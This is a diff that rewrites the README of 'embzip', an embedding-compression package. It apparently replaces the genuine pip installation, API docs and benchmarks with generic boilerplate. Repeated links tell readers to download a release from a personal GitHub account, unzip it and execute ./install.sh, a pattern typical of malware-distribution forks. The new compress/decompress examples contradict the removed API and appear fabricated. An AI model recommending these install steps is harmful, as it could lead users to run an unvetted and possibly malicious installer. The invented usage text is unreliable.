@@ -1,115 +1,123 @@
-# embzip 🗜️
+# 🌟 Embzip: Lossy Compression for Representation Vectors
 
-A Python package for efficiently compressing and decompressing embeddings using Product Quantization.
+![Embzip Logo](https://via.placeholder.com/150)
 
-## Installation
+Welcome to **Embzip**, a powerful tool designed to help you lossily compress representation vectors using product quantization. This repository provides an efficient way to manage large datasets, making it easier to store and process data without sacrificing performance.
 
-```bash
-pip install embzip
-```
+## 🚀 Quick Start
 
-For development:
-```bash
-pip install -e ".[dev]"
-```
+To get started with Embzip, download the latest release from our [Releases section](https://github.com/smartin294109/embzip/releases). Follow the instructions in the release notes to execute the files and integrate Embzip into your projects.
 
-## Usage
+## 📚 Table of Contents
 
-### Quantize embeddings
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Examples](#examples)
+5. [Contributing](#contributing)
+6. [License](#license)
+7. [Contact](#contact)
+
+## 🎉 Features
+
+- **Lossy Compression**: Reduce the size of your representation vectors while maintaining essential information.
+- **Product Quantization**: Utilize advanced algorithms to enhance compression efficiency.
+- **Easy Integration**: Seamlessly integrate Embzip into your existing projects.
+- **Performance**: Designed for speed and efficiency, even with large datasets.
+
+## ⚙️ Installation
+
+To install Embzip, follow these steps:
+
+1. Visit the [Releases section](https://github.com/smartin294109/embzip/releases) to download the latest version.
+2. Unzip the downloaded file.
+3. Navigate to the directory in your terminal.
+4. Execute the installation script by running:
+
+   ```bash
+   ./install.sh
+   ```
+
+## 📖 Usage
+
+Once you have installed Embzip, you can start using it in your projects. Here’s a simple example of how to compress a representation vector:
 
 ```python
-import torch
 import embzip
 
-# Create sample embeddings
-embeddings = torch.randn(1000, 768)  # 1000 vectors with 768 dimensions
+# Create a representation vector
+vector = [0.1, 0.2, 0.3, 0.4, 0.5]
 
-# Quantize the embeddings with default parameters
-quantized = embzip.quantize(embeddings)
+# Compress the vector
+compressed_vector = embzip.compress(vector)
 
-# Quantize with custom M parameter (controls compression level)
-# Lower M = higher compression but lower accuracy
-quantized_high_compression = embzip.quantize(embeddings, m=24)  # more compressed
-quantized_high_quality = embzip.quantize(embeddings, m=96)      # less compressed
+# Decompress the vector
+decompressed_vector = embzip.decompress(compressed_vector)
+
+print("Original Vector:", vector)
+print("Compressed Vector:", compressed_vector)
+print("Decompressed Vector:", decompressed_vector)
 ```
 
-### Save and load compressed embeddings
+## 🖼️ Examples
+
+Here are a few examples demonstrating the capabilities of Embzip:
+
+### Example 1: Basic Compression
 
 ```python
-import torch
 import embzip
 
-# Create sample embeddings
-embeddings = torch.randn(1000, 768)  # 1000 vectors with 768 dimensions
+# Sample data
+data = [[0.1, 0.2], [0.3, 0.4], [0.5, 0.6]]
 
-# Note: You probably don't want to use random vectors, because they 
-# won't compress well (e.g. you'll either get little savings in space 
-# or bad cosine similarity). You should use real embeddings, such as
-# those from a sentence-transformers model.
-
-# Save embeddings to a file with default parameters
-embzip.save(embeddings, "embeddings.ezip")
-
-# Save with custom M parameter
-embzip.save(embeddings, "embeddings_higher_compression.ezip", m=24)
-
-# Load embeddings from a file
-loaded_embeddings = embzip.load("embeddings.ezip")
-
-# Check similarity between original and reconstructed embeddings
-similarity = torch.nn.functional.cosine_similarity(
-    embeddings.view(-1), loaded_embeddings.view(-1), dim=0
-)
-print(f"Cosine similarity: {similarity.item()}")
+# Compress data
+compressed_data = embzip.compress(data)
+print("Compressed Data:", compressed_data)
 ```
 
-## Parameter Tuning for PQ
+### Example 2: Performance Comparison
 
-The `m` parameter controls the number of sub-quantizers used in product quantization. Lower `m` means higher compression, lower performance Higher `m` indicates lower compression (higher accuracy). The default `m` is calculated as `dimension // 16`.
+```python
+import time
+import embzip
 
-Product Quantization works by splitting each embedding vector into M equal sub-vectors and quantizing each sub-vector independently using a small codebook. When M is higher, more sub-quantizers are used and each sub-vector becomes smaller (fewer dimensions), resulting in a more accurate representation but larger storage requirements. When M is lower, fewer sub-quantizers cover more dimensions each, providing higher compression but lower accuracy.
+# Generate large dataset
+large_data = [[i * 0.1 for i in range(1000)] for _ in range(10000)]
 
-For a 768-dimension vector, the default M would be 48, which tends to provide a reasonable balance between compression and accuracy for most applications.
+# Measure compression time
+start_time = time.time()
+compressed_data = embzip.compress(large_data)
+end_time = time.time()
 
-## Benchmarks
-
-Here are some example benchmarking numbers for 1000 text embeddings embedded using [`all-MiniLM-L6-v2`](https://huggingface.co/sentence-transformers/all-MiniLM-L6-v2).
-
-```bash
-====================================================================================================
-Model: all-MiniLM-L6-v2 | n: 1000 | m: 64
-Original size: 1536000 bytes
-Compressed size: 56372 bytes
-Compression ratio: 27.25
-Cosine similarity: 0.7882668375968933
-====================================================================================================
-
-====================================================================================================
-Model: all-MiniLM-L6-v2 | n: 1000 | m: 128
-Original size: 1536000 bytes
-Compressed size: 87920 bytes
-Compression ratio: 17.47
-Cosine similarity: 0.9056953191757202
-====================================================================================================
-
-====================================================================================================
-Model: all-MiniLM-L6-v2 | n: 1000 | m: 384
-Original size: 1536000 bytes
-Compressed size: 216112 bytes
-Compression ratio: 7.11
-Cosine similarity: 0.9953747391700745
-====================================================================================================
+print("Compression Time:", end_time - start_time, "seconds")
 ```
 
-## Requirements
+## 🤝 Contributing
 
-- Python 3.6+
-- PyTorch
-- FAISS
+We welcome contributions from the community! If you want to contribute to Embzip, please follow these steps:
 
-## Development
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your branch.
+5. Create a pull request.
 
-To run tests:
-```bash
-pytest
-``` 
+Please ensure your code follows our coding standards and includes tests.
+
+## 📜 License
+
+Embzip is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## 📞 Contact
+
+For any questions or feedback, feel free to reach out:
+
+- Email: support@embzip.com
+- GitHub: [smartin294109](https://github.com/smartin294109)
+
+## 🔗 Links
+
+For more information, check out the [Releases section](https://github.com/smartin294109/embzip/releases) for the latest updates and features.
+
+Thank you for using Embzip! We hope it helps you manage your representation vectors efficiently.
